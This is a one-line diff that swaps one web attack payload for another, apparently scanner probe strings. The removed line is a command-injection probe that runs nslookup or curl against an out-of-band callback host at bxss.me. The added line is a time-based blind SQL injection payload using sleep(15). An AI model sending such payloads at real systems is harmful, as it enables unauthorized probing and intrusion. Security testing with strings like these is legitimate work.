@@ -1,1 +1,1 @@
-`(nslookup -q=cname hitifwlualwtcd156b.bxss.me||curl hitifwlualwtcd156b.bxss.me)`
+5550'XOR(555*if(now()=sysdate(),sleep(15),0))XOR'Z
